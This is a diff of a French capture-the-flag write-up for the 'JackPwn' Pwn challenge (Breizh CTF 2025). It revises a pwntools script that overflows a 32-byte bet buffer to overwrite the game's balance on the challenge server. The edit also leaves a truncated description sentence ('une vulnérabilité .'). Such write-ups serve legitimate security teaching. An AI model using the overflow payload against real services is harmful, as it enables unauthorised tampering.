@@ -10,7 +10,7 @@ ctfs: ["breizh-ctf"]
 
 ## Description du challenge
 
-JackPwn est un challenge de la catégorie Pwn du Breizh CTF 2025. Il simule un jeu de roulette avec une vulnérabilité de buffer overflow.
+JackPwn est un challenge de la catégorie Pwn du Breizh CTF 2025. Il simule un jeu de roulette avec une vulnérabilité .
 
 ## Analyse du binaire
 
@@ -163,20 +163,33 @@ Voici comment exploiter cette vulnérabilité :
 ```python
 from pwn import *
 
-# Connexion au serveur distant
-conn = remote('jackpwn.chall.ctf.bzh', 1337)
+# Configuration
+HOST = "jackpwn-180.chall.ctf.bzh"
+PORT = 1337
 
-# Création du payload
-payload = b"A" * 32  # Remplir le buffer mise
-payload += p32(0x1337)  # Écrire 0x1337 dans solde
+# Connexion
+p = remote(HOST, PORT)
 
-# Attente du prompt et envoi du payload
-conn.recvuntil(b"Votre mise : ")
-conn.sendline(payload)
+# Construction du payload
+# La structure est alignée sur 64 bits
+payload = b"rouge".ljust(32, b"\x00")  # Mise valide + padding avec des null bytes
+payload += p64(0x1335)                 # 0x1337 - 2, aligné sur 64 bits
 
-# Affichage du résultat
-response = conn.recvall().decode()
-print(response)
+p.recvuntil(b"Votre mise : ")
+p.sendline(payload)
+
+# Lire la sortie ligne par ligne
+while True:
+    try:
+        line = p.recvline(timeout=1).decode().strip()
+        print(line)
+        if "BZHCTF{" in line:
+            break
+    except:
+        break
+
+p.close()
+
 ```
 
 ## Flag
